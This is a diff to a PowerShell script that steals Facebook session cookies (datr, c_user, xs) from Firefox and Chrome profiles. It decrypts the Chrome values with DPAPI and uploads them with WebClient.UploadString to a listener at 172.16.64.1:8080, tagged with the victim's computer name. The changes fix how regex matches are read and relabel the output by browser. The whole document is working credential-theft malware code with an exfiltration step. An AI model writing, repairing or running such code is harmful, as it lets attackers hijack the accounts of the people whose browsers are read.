@@ -32,19 +32,22 @@ function Get-FacebookCreds-Firefox() {
 	# First the magic bytes for the facebook string, datr size is 24
 	$PwdRegex = [Regex] '\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x64\x61\x74\x72([\s\S]{24})'
 	$PwdMatches = $PwdRegex.Matches($BinaryText)
-	$datr = $PwdMatches.groups[1]
+	$datr = $PwdMatches | ForEach-Object { $_.Groups[1].Value }
+	# $datr = $PwdMatches.groups[1]
 
 	# First the magic bytes for the facebook string, c_user size is 15
 	$PwdRegex = [Regex] '\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x63\x5F\x75\x73\x65\x72([\s\S]{15})'
 	$PwdMatches = $PwdRegex.Matches($BinaryText)
-	$c_user = $PwdMatches.groups[1]
+	$c_user = $PwdMatches | ForEach-Object { $_.Groups[1].Value }
+	# $c_user = $PwdMatches.groups[1]
 
 	# First the magic bytes for the facebook string, xs size is 44
 	$PwdRegex = [Regex] '\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x78\x73([\s\S]{44})'
 	$PwdMatches = $PwdRegex.Matches($BinaryText)
-	$xs = $PwdMatches.groups[1]
+	$xs = $PwdMatches | ForEach-Object { $_.Groups[1].Value }
+	# $xs = $PwdMatches.groups[1]
 
-	"$env:computername ---> "
+	"Firefox ---> "
 	"datr is $datr ###"
 	"c_user is $c_user ###"
 	"xs is $xs ###"
@@ -79,7 +82,8 @@ function Get-FacebookCreds-Chrome() {
 	$PwdMatches = $PwdRegex.Matches($BinaryText)
 
 	# [System.BitConverter]::ToString($Encoding.GetBytes($PwdMatches.groups[2]));
-	$Pwd = $Encoding.GetBytes($PwdMatches.groups[2])
+	$Pwd = $Encoding.GetBytes(($PwdMatches | ForEach-Object { $_.Groups[2].Value }))
+	# $Pwd = $Encoding.GetBytes($PwdMatches.groups[2])
 	$Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Pwd,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 	$datr = [System.Text.Encoding]::Default.GetString($Decrypt)
 
@@ -89,7 +93,8 @@ function Get-FacebookCreds-Chrome() {
 	$PwdMatches = $PwdRegex.Matches($BinaryText)
 
 	# [System.BitConverter]::ToString($Encoding.GetBytes($PwdMatches.groups[2]));
-	$Pwd = $Encoding.GetBytes($PwdMatches.groups[2])
+	$Pwd = $Encoding.GetBytes(($PwdMatches | ForEach-Object { $_.Groups[2].Value }))
+	# $Pwd = $Encoding.GetBytes($PwdMatches.groups[2])
 	$Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Pwd,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 	$c_user = [System.Text.Encoding]::Default.GetString($Decrypt)
 
@@ -99,11 +104,12 @@ function Get-FacebookCreds-Chrome() {
 	$PwdMatches = $PwdRegex.Matches($BinaryText)
 
 	# [System.BitConverter]::ToString($Encoding.GetBytes($PwdMatches.groups[2]));
-	$Pwd = $Encoding.GetBytes($PwdMatches.groups[2])
+	$Pwd = $Encoding.GetBytes(($PwdMatches | ForEach-Object { $_.Groups[2].Value }))
+	# $Pwd = $Encoding.GetBytes($PwdMatches.groups[2])
 	$Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Pwd,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 	$xs = [System.Text.Encoding]::Default.GetString($Decrypt)
 
-	"$env:computername ---> "
+	"Chrome ---> "
 	"datr is $datr ###"
 	"c_user is $c_user ###"
 	"xs is $xs ###"
@@ -112,7 +118,7 @@ function Get-FacebookCreds-Chrome() {
 
 function Payload() {
 
-	Invoke-Expression (New-Object Net.WebClient).UploadString('http://172.16.64.1:8080/l', $(Get-FacebookCreds-Chrome))
-	Invoke-Expression (New-Object Net.WebClient).UploadString('http://172.16.64.1:8080/l', $(Get-FacebookCreds-Firefox))
+	Invoke-Expression (New-Object Net.WebClient).UploadString("http://172.16.64.1:8080/$env:computername", $(Get-FacebookCreds-Chrome))
+	Invoke-Expression (New-Object Net.WebClient).UploadString("http://172.16.64.1:8080/$env:computername", $(Get-FacebookCreds-Firefox))
 
 }
